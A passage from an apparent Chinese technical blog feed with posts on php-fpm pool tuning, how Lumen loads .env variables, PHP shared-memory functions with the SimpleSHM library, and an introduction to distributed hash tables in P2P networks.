<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[global]pid = /usr/<span class="built_in">local</span>/php/var/run/php-fpm.pid</span><br><span class="line"></span><br><span class="line">error_log = /home/wwwlogs/php-fpm.log</span><br><span class="line"></span><br><span class="line">log_level = notice</span><br><span class="line"></span><br><span class="line">rlimit_files = 65535</span><br><span class="line"></span><br><span class="line">rlimit_core = 0</span><br><span class="line"></span><br><span class="line">[www]</span><br><span class="line"></span><br><span class="line">listen = /tmp/php-cgi.sock</span><br><span class="line"></span><br><span class="line">user = nobody   nginx, php-fpm进程的权限不能以网站所有权运行安全有问题</span><br><span class="line"></span><br><span class="line">group = nobody   nginx, php-fpm 进程 的权限不能以网站所有权运行安全有问题</span><br><span class="line"></span><br><span class="line">pm = dynamic</span><br><span class="line"></span><br><span class="line">pm.max_children = 36 静态模式开启进程数</span><br><span class="line"></span><br><span class="line">pm.start_servers = 9 动态模式默认开启进程 数</span><br><span class="line"></span><br><span class="line">pm.min_spare_servers = 8 动态模式默认最低保留进程 数</span><br><span class="line"></span><br><span class="line">pm.max_spare_servers = 36 动态模式默认最高 进程数具体通过netstat -napo |grep <span class="string">"php-fpm"</span> | wc -l和系统负载确定</span><br><span class="line"></span><br><span class="line">pm.max_requests = 4096 进程执行xxx后重启释放内存避免内存泄漏</span><br><span class="line"></span><br><span class="line">request_terminate_timeout = 100 进程超时时间</span><br><span class="line"></span><br><span class="line">request_slowlog_timeout = 3s 记录大于3秒的php执行命令</span><br><span class="line"></span><br><span class="line">slowlog = /home/wwwlogs/php-fpm.log.slow</span><br><span class="line"></span><br><span class="line">rlimit_files = 65535 这个值一定要改默认的太小不改日志会有错误但是要和全局文件数相同具体查看<span class="built_in">ulimit</span> -n系统全局设置</span><br><span class="line"></span><br><span class="line">rlimit_core = 0</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line">pid = /usr/<span class="built_in">local</span>/php/var/run/php-fpm.pid</span><br><span class="line"></span><br><span class="line">error_log = /home/wwwlogs/php-fpm.log</span><br><span class="line"></span><br><span class="line">log_level = notice</span><br><span class="line"></span><br><span class="line">rlimit_files = 65535</span><br><span class="line"></span><br><span class="line">rlimit_core = 0</span><br><span class="line"></span><br><span class="line">[www]</span><br><span class="line"></span><br><span class="line">listen = /tmp/php-cgi.sock</span><br><span class="line"></span><br><span class="line">user = nobody</span><br><span class="line"></span><br><span class="line">group = nobody</span><br><span class="line"></span><br><span class="line">pm = dynamtic</span><br><span class="line"></span><br><span class="line">pm.max_children = 20</span><br><span class="line"></span><br><span class="line">pm.start_servers = 2</span><br><span class="line"></span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line"></span><br><span class="line">pm.max_spare_servers = 20</span><br><span class="line"></span><br><span class="line">pm.max_requests = 4096</span><br><span class="line"></span><br><span class="line">request_slowlog_timeout = 3s</span><br><span class="line"></span><br><span class="line">slowlog = /home/wwwlogs/php-fpm.log.slow</span><br><span class="line"></span><br><span class="line">request_terminate_timeout = 100</span><br><span class="line"></span><br><span class="line">rlimit_files = 65535</span><br><span class="line"></span><br><span class="line">rlimit_core = 0</span><br></pre></td></tr></table></figure>

<p>相关链接：</p>
<p><a href="http://blog.51cto.com/itfun/1896016" target="_blank" rel="noopener">分析502服务器错误</a></p>
<p>总结：</p>
<p>1、每个进程约占用20-25M内存， top命令查询空闲内存大小， max_children = 空闲内存 / 20~25</p>
<p>2、request_terminate_timeout 默认是0 ， 表示请求不中断，如果一个外部链接请求不到资源， 就会一直阻塞。所以这个时间需要和php.ini里面的执行时间保持一直。</p>
<p>3、修改 php.ini 的 内存限制 memory_limit = 128M （5个进程的大小）甚至更大</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>关于Lumen(Laravel)中.env文件中的环境变量是如何生效的</title>
    <url>/articles/%E5%85%B3%E4%BA%8ELumen-Laravel-%E4%B8%AD-env%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%9F%E6%95%88%E7%9A%84/</url>
    <content><![CDATA[<p>.env 文件可自定义其他任何有效的环境变量，并可通过  调用 env() 或 $_SERVER 或 $_ENV  来获取该变量。那么env()是如何加载到这些变量的呢？</p>
<p>函数env()：在Lumen的vendor/laravel/lumen-framework/src/helpers.php中，我们可以发现env函数是这样被定义的：</p>
<p><img src="/articles/关于Lumen-Laravel-中-env文件中的环境变量是如何生效的/psb.png" alt></p>
<p>可见，env函数中调用了 getenv() 来读取环境变量。</p>
<p><code>vlucas/phpdotenv</code>：我们知道getenv()是PHP原生提供可读取 $_SERVER 或 $_ENV 全局变量的函数API，.env文件中的环境变量为何可以通过getenv()来获取呢？<a href="https://github.com/vlucas/phpdotenv" target="_blank" rel="noopener">vlucas/phpdotenv</a>就是这个幕后功臣，在Lumen 或 Laravel 的vendor下可以找到她，如果要单独下载她，<a href="https://github.com/vlucas/phpdotenv" target="_blank" rel="noopener">去这里</a>。在vlucas/phpdotenv/src/Loader.php文件中，我们可以看到.env被加载进一个数组，然后把每一行看作setter并调用setEnvironmentVariable()方法：</p>
<p><img src="/articles/关于Lumen-Laravel-中-env文件中的环境变量是如何生效的/psb2.png" alt></p>
<p>Loader::setEnvironmentVariable($name, $value = null) 的定义如下：</p>
<p><img src="/articles/关于Lumen-Laravel-中-env文件中的环境变量是如何生效的/psb3.png" alt></p>
<p>PHP dotenv 是什么：</p>
<p>Loads environment variables from .env to getenv(), $_ENV and $_SERVER automagically.This is a PHP version of the original Ruby dotenv.</p>
<p>Why .env：</p>
<p>You should never store sensitive credentials in your code. Storing configuration in the environment is one of the tenets of a twelve-factor app. Anything that is likely to change between deployment environments – such as database credentials or credentials for 3rd party services – should be extracted from the code into environment variables.Basically, a .env file is an easy way to load custom configuration variables that your application needs without having to modify .htaccess files or Apache/nginx virtual hosts. This means you won’t have to edit any files outside the project, and all the environment variables are always set no matter how you run your project - Apache, Nginx, CLI, and even PHP 5.4’s built-in webserver. It’s WAY easier than all the other ways you know of to set environment variables, and you’re going to love it.. NO editing virtual hosts in Apache or Nginx. NO adding php_value flags to .htaccess files. EASY portability and sharing of required ENV values. COMPATIBLE with PHP’s built-in web server and CLI runner</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>使用 PHP 直接在共享内存中存储数据集</title>
    <url>/articles/%E4%BD%BF%E7%94%A8-PHP-%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E4%B8%AD%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE%E9%9B%86/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>共享内存是一种在相同机器中的应用程序之间交换数据的有效方式。一个进程可创建一个可供其他进程访问的内存段，只要它分配了正确的权限。每个内存段拥有一个惟一的 ID（称为 shmid），这个 ID 指向一个物理内存区域，其他进程可在该区域操作它。创建并提供了合适的权限之后，同一台机器中的其他进程就可以操作这些内存段：读取、写入和删除。</p>
<p>这表明使用 C 语言编写的应用程序可与使用其他语言（比如 Java™ 或 PHP）编写的应用程序共享信息。它们都可以共享信息，只要它们可访问和理解该信息。共享内存在针对大部分语言的实现中得到了广泛使用，所以访问应该不是问题。要理解信息，我们可以使用一种标准格式，比如 XML 或 JSON。</p>
<p>共享内存的使用是一种在进程之间交换数据的快速方法，主要因为在创建内存段之后传递数据，不会涉及内核。这种方法常常称为进程间通信 (IPC)。其他 IPC 方法包括管道、消息队列、RPC 和套接字。当使用需要彼此通信的应用程序的生态系统时，这种在应用程序之间快速、可靠地交换数据的能力非常有用。取决于生态系统的大小，使用数据库在应用程序之间交换信息的常用方法常常会导致查询缓慢，甚至 I/O 阻塞。使用共享内存，没有 I/O 会减缓开发人员的进度。</p>
<p>本文的提议非常简单，学习如何使用 PHP 创建和操作共享内存段，使用它们存储可供其他应用程序使用的数据集。即使没有使用共享内存交换数据的计划，它本身也在许多好处，因为它使应用程序能够远离 I/O 问题。将数据集直接存储在内存中具有诸多优势，从 Web 服务数据缓存到会话共享。它是一个非常有用的概念，每个 PHP 开发人员都应该知道。</p>
<h3 id="共享内存和-PHP"><a href="#共享内存和-PHP" class="headerlink" title="共享内存和 PHP"></a>共享内存和 PHP</h3><p>PHP 拥有丰富的可用扩展，共享内存也一样。使用一些共享的函数，无需安装任何扩展，开发人员就能够轻松操作内存段。</p>
<h3 id="创建内存段"><a href="#创建内存段" class="headerlink" title="创建内存段"></a>创建内存段</h3><p>共享内存函数类似于文件操作函数，但无需处理一个流，您将处理一个共享内存访问 ID。第一个示例就是 shmop_open 函数，它允许您打开一个现有的内存段或创建一个新内存段。此函数非常类似于经典的 fopen 函数，后者打开用于文件操作的流，返回一个资源供其他希望读取或写入该打开的流的函数使用。让我们看看清单 1 中的 shmop_open。</p>
<p>清单 1. shmop_open 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $systemid = ftok(__FILE__,'t'); // System ID for the shared memory segment</span></span><br><span class="line">$systemid = <span class="number">864</span>; <span class="comment">// System ID for the shared memory segment</span></span><br><span class="line">$mode = <span class="string">"c"</span>; <span class="comment">// Access mode</span></span><br><span class="line">$permissions = <span class="number">0755</span>; <span class="comment">// Permissions for the shared memory segment</span></span><br><span class="line">$size = <span class="number">1024</span>; <span class="comment">// Size, in bytes, of the segment</span></span><br><span class="line"></span><br><span class="line">$shmid = shmop_open($systemid, $mode, $permissions, $size);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>该函数中出现的第一个事物是系统 ID 参数。这是标识系统中的共享内存段的数字。第二个参数是访问模式，它非常类似于 fopen 函数的访问模式。您可以在 4 种不同的模式下访问一个内存段：</p>
<ul>
<li>模式 “a”，它允许您访问只读内存段</li>
<li>模式 “w”，它允许您访问可读写的内存段</li>
<li>模式 “c”，它创建一个新内存段，或者如果该内存段已存在，尝试打开它进行读写</li>
<li>模式 “n”，它创建一个新内存段，如果该内存段已存在，则会失败</li>
<li>第三个参数是内存段的权限。您必须在这里提供一个八进制值。</li>
</ul>
<p>第四个参数提供内存段大小，以字节为单位。在写入一个内存段之前，您必须在它之上分配适当的字节数。</p>
<p>请注意，此函数返回一个 ID 编号，其他函数可使用该 ID 编号操作该共享内存段。这个 ID 是共享内存访问 ID，与系统 ID 不同，它以参数的形式传递。请注意不要混淆这两者。如果失败，shmop_open 将返回 FALSE。</p>
<h3 id="向内存段写入数据"><a href="#向内存段写入数据" class="headerlink" title="向内存段写入数据"></a>向内存段写入数据</h3><p>使用 shmop_write 函数向共享内存块写入数据。此函数的使用很简单，它仅接受 3 个参数，如清单 2 所示。</p>
<p>清单 2. 使用 shmop_write 向共享内存块写入数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$shmid = shmop_open(<span class="number">864</span>, <span class="string">'c'</span>, <span class="number">0755</span>, <span class="number">1024</span>);</span><br><span class="line">shmop_write($shmid, <span class="string">"Hello World!"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个函数类似于 fwrite 函数，后者有两个参数：打开的流资源（由 fopen 返回）和您希望写入的数据。shmop_write 函数也执行此任务。</p>
<p>第一个参数是 shmop_open 返回的 ID，它识别您操作的共享内存块。第二个参数是您希望存储的数据，最后的第三个参数是您希望开始写入的位置。默认情况下，我们始终使用 0 来表示开始写入的位置。请注意，此函数在失败时会返回 FALSE，在成功时会返回写入的字节数。</p>
<h3 id="从内存段读取数据"><a href="#从内存段读取数据" class="headerlink" title="从内存段读取数据"></a>从内存段读取数据</h3><p>从共享内存段读取数据很简单。您只需要一个打开的内存段和 shmop_read 函数。此函数接受一些参数，工作原理类似于 fread。参见清单 3，读取一个 PHP 文件的内容。</p>
<p>清单 3. 使用 shmop_read 读取一个文件的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$stream = fopen(<span class="string">'file.txt'</span>, <span class="string">'r+'</span>);</span><br><span class="line">fwrite($stream, <span class="string">"Hello World!"</span>);</span><br><span class="line"><span class="keyword">echo</span> fread($stream, <span class="number">11</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取共享内存段的内容的过程与此类似，如清单 4 所示：</p>
<p>清单 4. 读取共享内存段的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$shmid = shmop_open(<span class="number">864</span>, <span class="string">'c'</span>, <span class="number">0755</span>, <span class="number">1024</span>);</span><br><span class="line">shmop_write($shmid, <span class="string">"Hello World!"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> shmop_read($shmid, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>请留意这里的参数。shmop_read 函数将接受 shmop_open 返回的 ID，我们已知道它，不过它还接受另外两个参数。第二个参数是您希望从内存段读取的位置，而第三个是您希望读取的字节数。第二个参数可以始终为 0，表示数据的开头，但第三个参数可能存在问题，因为我们不知道我们希望读取多少字节。</p>
<p>这非常类似于我们在 fread 函数中的行为，该函数接受两个参数：打开的流资源（由 fopen 返回）和您希望从该流读取的字节数。使用 filesize 函数（它返回一个文件中的字节数）来完整地读取它。</p>
<p>幸运的是，当使用共享内存段时，shmop_size 函数返回一个内存段的大小（以字节为单位），类似于 filesize 函数。参见清单 5。</p>
<p>清单 5. shmop_size 函数返回内存段大小，以字节为单位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$shmid = shmop_open(<span class="number">864</span>, <span class="string">'c'</span>, <span class="number">0755</span>, <span class="number">1024</span>);</span><br><span class="line">shmop_write($shmid, <span class="string">"Hello World!"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$size = shmop_size($shmid);</span><br><span class="line"><span class="keyword">echo</span> shmop_read($shmid, <span class="number">0</span>, $size);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="删除内存段"><a href="#删除内存段" class="headerlink" title="删除内存段"></a>删除内存段</h3><p>我们学习了如何打开、写入和读取共享内存段。要完成我们的 CRUD 类，我们还需要学习如何删除内存段。该任务可使用 shmop_delete 函数轻松完成，该函数仅接受一个参数：我们希望删除的共享内存 ID。</p>
<p>清单 6. shmop_delete 标记要删除的内存段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$shmid = shmop_open(<span class="number">864</span>, <span class="string">'c'</span>, <span class="number">0755</span>, <span class="number">1024</span>);</span><br><span class="line">shmop_write($shmid, <span class="string">"Hello World!"</span>, <span class="number">0</span>);</span><br><span class="line">shmop_delete($shmid);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>这不会实际删除该内存段</code>： 它将该内存段标记为删除，因为共享内存段在有其他进程正在使用它时无法被删除。shmop_delete 函数将该内存段标记为删除，阻止任何其他进程打开它。要删除它，我们需要关闭该内存段。</p>
<h3 id="关闭内存段"><a href="#关闭内存段" class="headerlink" title="关闭内存段"></a>关闭内存段</h3><p>打开一个共享内存段会 “附加” 到它。附加该内存段之后，我们可在其中进行读取和写入，但完成操作后，我们必须从它解除。这使用清单 7 中的 shmop_close 函数来完成。</p>
<p>这非常类似于处理文件时的 fclose 函数。打开包含一个文件的流并在其中读取或写入数据后，我们必须关闭它，否则将发生锁定。</p>
<p>清单 7. 使用 shmop_close 与一个内存段分开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$shmid = shmop_open(<span class="number">864</span>, <span class="string">'c'</span>, <span class="number">0755</span>, <span class="number">1024</span>);</span><br><span class="line">shmop_write($shmid, <span class="string">"Hello World!"</span>, <span class="number">0</span>);</span><br><span class="line">shmop_delete($shmid);</span><br><span class="line">shmop_close($shmid);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用共享内存作为一个存储选项"><a href="#使用共享内存作为一个存储选项" class="headerlink" title="使用共享内存作为一个存储选项"></a>使用共享内存作为一个存储选项</h3><p>有了共享内存和共享内存段上基本 CRUD 操作的基本知识，是时候应用此知识了。我们可以使用共享内存作为一种独特的存储选项，提供快速读/写操作和进程互操作性等优势。对于 Web 应用程序，这意味着：</p>
<ul>
<li>缓存存储（数据库查询、Web 服务数据、外部数据）</li>
<li>会话存储</li>
<li>应用程序之间的数据交换</li>
</ul>
<p>在继续之前，我想介绍一个名为 SimpleSHM 小型库。SimpleSHM 是一个较小的抽象层，用于使用 PHP 操作共享内存，支持以一种面向对象的方式轻松操作内存段。在编写使用共享内存进行存储的小型应用程序时，这个库可帮助创建非常简洁的代码。要了解 SimpleSHM，请访问 <a href="https://github.com/klaussilveira/SimpleSHM" target="_blank" rel="noopener">GitHub 页面</a>。</p>
<p>您可以使用 3 个方法进行处理：读、写和删除。从该类中简单地实例化一个对象，可以控制打开的共享内存段。清单 8 展示了基本用途。</p>
<p>清单 8. SimpleSHM 基本用途</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$memory = <span class="keyword">new</span> SimpleSHM;</span><br><span class="line">$memory-&gt;write(<span class="string">'Sample'</span>);</span><br><span class="line"><span class="keyword">echo</span> $memory-&gt;read();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>请注意，这里没有为该类传递一个 ID。如果没有传递 ID，它将随机选择一个编号并打开该编号的新内存段。我们可以以参数的形式传递一个编号，供构造函数打开现有的内存段，或者创建一个具有特定 ID 的内存段，如清单 9 所示。</p>
<p>清单 9. 打开一个特定的内存段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$new = <span class="keyword">new</span> SimpleSHM(<span class="number">897</span>);</span><br><span class="line">$new-&gt;write(<span class="string">'Sample'</span>);</span><br><span class="line"><span class="keyword">echo</span> $new-&gt;read();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>__destructor 负责在该内存段上调用 shmop_close 来取消设置对象，以与该内存段分离。我们将这称为 “SimpleSHM 101”。现在让我们将此方法用于更高级的用途：使用共享内存作为存储。存储数据集需要序列化，因为数组或对象无法存储在内存中。尽管这里使用了 JSON 来序列化，但任何其他方法（比如 XML 或内置的 PHP 序列化功能）也已足够。清单 10 给出了一个示例。</p>
<p>清单 10. 使用共享内存作为存储</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'SimpleSHM.class.php'</span>);</span><br><span class="line"></span><br><span class="line">$results = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'user'</span> =&gt; <span class="string">'John'</span>,</span><br><span class="line">    <span class="string">'password'</span> =&gt; <span class="string">'123456'</span>,</span><br><span class="line">    <span class="string">'posts'</span> =&gt; <span class="keyword">array</span>(<span class="string">'My name is John'</span>, <span class="string">'My name is not John'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$data = json_encode($results);</span><br><span class="line"></span><br><span class="line">$memory = <span class="keyword">new</span> SimpleSHM;</span><br><span class="line">$memory-&gt;write($data);</span><br><span class="line">$storedarray = json_decode($memory-&gt;read());</span><br><span class="line"></span><br><span class="line">print_r($storedarray);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们成功地将一个数组序列化为一个 JSON 字符串，将它存储在共享内存块中，从中读取数据，去序列化 JSON 字符串，并显示存储的数组。这看起来很简单，但请想象一下这个代码片段带来的可能性。您可以使用它存储 Web 服务请求、数据库查询或者甚至模板引擎缓存的结果。在内存中读取和写入将带来比在磁盘中读取和写入更高的性能。</p>
<p>使用此存储技术不仅对缓存有用，也对应用程序之间的数据交换也有用，只要数据以两端都可读的格式存储。不要低估共享内存在 Web 应用程序中的力量。可采用许多不同的方式来巧妙地实现这种存储，惟一的限制是开发人员的创造力和技能。</p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>本文介绍了用于操作共享内存段的 PHP 工具包中的大部分工具，解释了共享内存的工作原理。此外，还提供了改进 Web 应用程序的建议，列出了在为 Web 应用程序问题创建解决方案时要考虑的一些因素。这些概念和实现指南可帮助您建立一个起点。我们构建的早期模型可帮助您构想更复杂的特性和解决方案。</p>
<h3 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h3><p>我们列出了共享内存中最可能实现的一些常见问题，比如缓存、会话共享和应用程序之间的常见数据交换。此篇共享内存简介为您就常见问题而探索更佳解决方案提供机会。您可以自由扩展当前的 SimpleSHM 实现，以匹配您的需要和将更改贡献给该项目。</p>
<p>注意：windows环境下，上面清单方法需要在php_shmop.dll开启的环境下才可运行。其中ftok方法实现:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将路径名和项目标识符转换为System V IPC 密钥</span></span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'ftok'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ftok</span><span class="params">($filename = <span class="string">""</span>, $proj = <span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($filename) || !file_exists($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filename = $filename . (string)$proj;</span><br><span class="line">            <span class="keyword">for</span> ($key = <span class="keyword">array</span>(); sizeof($key) &lt; strlen($filename); $key[] = ord(substr($filename, sizeof($key), <span class="number">1</span>))) ;</span><br><span class="line">            <span class="keyword">return</span> dechex(array_sum($key));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>分布式哈希表 (DHT) 和 P2P 技术</title>
    <url>/articles/%E5%88%86%E5%B8%83%E5%BC%8F%E5%93%88%E5%B8%8C%E8%A1%A8-DHT-%E5%92%8CP2P%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>相信没有人没使用过 P2P 技术. BT 种子和磁力链接就是最常见的 P2P 技术, 使用 P2P 技术, 文件不再需要集中存储在一台服务器上, 而是分散再各个用户的节点上, 每个人都是服务的提供者, 也是服务的使用者. 这样的系统具有高可用性, 不会由于一两台机的宕机而导致整个服务不可用. 那么这样一个系统是怎样实现的, 如何做到<strong>去中心化(decentralization)</strong>和<strong>自我组织(self-organization)</strong>的呢? 这篇文章我们来讨论一下这个问题.</p>
<p>这篇文章先会介绍 P2P 网络的整体思路, 并引出 P2P 网络的主角 - <strong>分布式哈希表(Distributed Hash Table, DHT)</strong>; 接着会介绍两种分布式哈希表算法. 这些会让你对 P2P 技术有一个较为具体的了解.</p>
<h2 id="2-P2P-网络的概述"><a href="#2-P2P-网络的概述" class="headerlink" title="2. P2P 网络的概述"></a>2. P2P 网络的概述</h2><h3 id="2-1-传统-CS-网络和-P2P-网络"><a href="#2-1-传统-CS-网络和-P2P-网络" class="headerlink" title="2.1 传统 CS 网络和 P2P 网络"></a>2.1 传统 CS 网络和 P2P 网络</h3><p>CS 架构即 Client-Server 架构, 由服务器和客户端组成: 服务器为服务的提供者, 客户端为服务的使用者. 我们如今使用的很多应用程序例如网盘, 视频应用, 网购平台等都是 CS 架构. 它的架构如下图所示:</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_1.png" alt="cs"></p>
<p>当然服务器通常不是一个单点, 往往是一个集群; 但本质上是一样的. CS 架构的问题在于, 一旦服务器关闭, 例如宕机, 被 DDoS 攻击或者被查水表, 客户端就无法使用了, 服务也就失效了.</p>
<p>为了解决这个问题, 人们提出了 <strong>P2P 网络(Peer-to-peer Networking)</strong>. 在 P2P 网络中, 不再由中心服务器提供服务, 不再有”服务器”的概念, 每个人即使服务的提供者也是服务的使用者 – i.e., 每个人都有可能是服务器. 我们常用的 BT 种子和磁力链接下载服务就是 P2P 架构. 人们对 P2P 系统作了如下定义:</p>
<blockquote>
<p><strong>a Peer-to-Peer system</strong> is a self-organizing system of equal, autonomous entities (peers) <strong>which</strong> aims for the shared usage of distributed resources in a networked environment avoiding central services.</p>
</blockquote>
<p>一个 P2P 系统是每个节点都是平等, 自主的一个自我组织的系统, 目的是在避免中心服务的网络环境中共享使用分布式资源.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_2.png" alt="P2P"></p>
<p>P2P 系统的架构如上图所示. 由于去掉了中心服务器, P2P 系统的稳定性就强很多: 少数几个个节点的失效几乎不会影响整个服务; 节点多为用户提供, 可以做到 “野火烧不尽, 春风吹又生”. 即使有人想恶意破坏, 也无法对整个系统造成有效打击.</p>
<h3 id="2-2-朴素的-P2P-网络"><a href="#2-2-朴素的-P2P-网络" class="headerlink" title="2.2 朴素的 P2P 网络"></a>2.2 朴素的 P2P 网络</h3><p>P2P 网络需要解决的一个最重要的问题就是, 如何知道用户请求的资源位于哪个节点上. 在第一代 P2P 网络中, 人们设置了一台中央服务器来管理资源所处的位置. 当一个用户想要发布资源, 他需要告诉中央服务器它发布的资源信息和自己的节点信息; 当其他用户请求资源的时候, 需要先请求中央服务器以获取资源发布者的节点信息, 再向资源发布者请求资源.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_3.png" alt="central-server"></p>
<p>这种 P2P 网络的好处是效率高, 只需要请求一次中央服务器就可以发布或获取资源. 然而它的缺点也很明显: 中央服务器是这个网络系统最脆弱的地方, 它需要存储所有资源的信息, 处理所有节点的请求; 一旦中央服务器失效, 整个网络就无法使用.</p>
<p>早期的另外一种 P2P 网络采取了不同的策略, 它不设置中央服务器; 当用户请求资源时, 它会请求它所有的邻接节点, 邻接节点再依次请求各自的邻接节点, 并使用一些策略防止重复请求, 直到找到拥有资源的节点. 也就是说, 这是一种泛洪搜索(Flooding Search).</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_4.png" alt="flooding-search"></p>
<p>这种 P2P 网络去除了中央服务器, 它的稳定性就强多了. 然而它太慢了. 一次查找可能会产生大量的请求, 可能会有大量的节点卷入其中. 一旦整个系统中的的节点过多, 性能就会变得很差.</p>
<h3 id="2-3-分布式哈希表"><a href="#2-3-分布式哈希表" class="headerlink" title="2.3 分布式哈希表"></a>2.3 分布式哈希表</h3><p>为了解决这些问题, 分布式哈希表应运而生. 在一个有 $n$ 个节点的分布式哈希表中, 每个节点仅需存储 $\mathrm{O}(\log{n})$  个其他节点, 查找资源时仅需请求 $\mathrm{O}(\log{n})$ 个节点, 并且无需中央服务器, 是一个完全自组织的系统. 分布式哈希表有很多中实现算法, <a href="#3-Chord-算法">第 3 节</a>和<a href="#4-Kademlia-算法">第 4 节</a>会详细介绍其中的两种. 这里我们先来看看它们共通的思想.</p>
<p><strong>地址管理</strong></p>
<p>首先, 在分布式哈希表中, 每个节点和资源都有一个唯一标识, 通常是一个 160 位整数. 为方便起见, 我们称节点的唯一标识为 ID, 称资源的唯一标识为 Key. 我们可以把一个节点的 IP 地址用 SHA-1 算法哈希得到这个节点的 ID; 同样地, 把一个资源文件用 SHA-1 算法哈希就能得到这个资源的 Key 了.</p>
<p>定义好 ID 和 Key 之后, 就可以发布和存储资源了. 每个节点都会负责一段特定范围的 Key, 其规则取决于具体的算法. 例如, 在 Chord 算法中, 每个 Key 总是被第一个 ID 大于或等于它的节点负责. 在发布资源的的时候, 先通过哈希算法计算出资源文件的 Key, 然后联系负责这个 Key 的节点, 把资源存放在这个节点上. 当有人请求资源的时候, 就联系负责这个 Key 的节点, 把资源取回即可.</p>
<p>发布和请求资源有两种做法, 一种是直接把文件传输给负责的节点, 由它存储文件资源; 请求资源时再由这个节点将文件传输给请求者. 另一种做法是由发布者自己设法存储资源, 发布文件时把文件所在节点的地址传输给负责的节点, 负责的节点仅存储一个地址; 请求资源的时候会联系负责的节点获取资源文件的地址, 然后再取回资源. 这两种做法各有优劣. 前者的好处是资源的发布者不必在线, 请求者也能获取资源; 坏处是如果文件过大, 就会产生较大的传输和存储成本. 后者的好处是传输和存储成本都比较小, 但是资源的发布者, 或者说资源文件所在的节点必须一直在线.</p>
<p><strong>路由算法</strong></p>
<p>上面我们简述了地址系统, 以及如何发布和取回资源. 但是现在还有一个大问题: 如何找到负责某个特定 Key 的节点呢? 这里就要用到路由算法了. 不同的分布式哈希表实现有不同的路由算法, 但它们的思路是一致的.</p>
